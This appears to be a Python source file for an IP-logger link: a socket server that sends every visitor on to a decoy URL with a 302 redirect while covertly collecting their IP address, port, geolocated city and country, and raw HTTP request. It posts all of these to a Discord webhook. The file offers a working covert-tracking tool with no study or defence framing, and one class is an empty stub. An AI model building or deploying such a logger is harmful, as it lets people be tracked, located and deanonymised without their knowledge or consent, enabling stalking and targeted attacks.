import discord_webhook
import socket
import threading
import geocoder

class Logger_link(threading.Thread):
    def __init__(self, url: str, port: int, host_ip: str) -> None:
        threading.Thread.__init__(self)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("", port))
        self.counter = 0
        self.url = url
        self.port = port
        self.host_ip = host_ip
    
    def run(self) -> None:
        if not self.port == 80:
            print(f"http://{self.host_ip}:{self.port}/")
        else:
            print(f"http://{self.host_ip}/")
        while True:
            self.socket.listen(10)
            client, (ip, port) = self.socket.accept()
            threading.Thread(target=self.redirection, args=[client, ip , port]).start()
    
    def redirection(self, client: socket.socket, ip: str, port: int) -> None:
        data = client.recv(4096)
        client.send(f"HTTP/1.1 302 Found\r\nLocation: {self.url}\r\n\r\n".encode())
        client.close()
        webhook = discord_webhook.DiscordWebhook(url="URL")
        webhook.add_embed(embed=discord_webhook.DiscordEmbed(title=ip, description=f"""port: {port}
localisation: {geocoder.ip(socket.gethostbyname(ip)).city}[{geocoder.ip(socket.gethostbyname(ip)).country}]
request: {data.decode("utf-8")}
request-size = {len(data)}
""", color='FF0000'))
        webhook.execute()

class BDD():
    def __init__(self) -> None:
        try: ...
        except: ...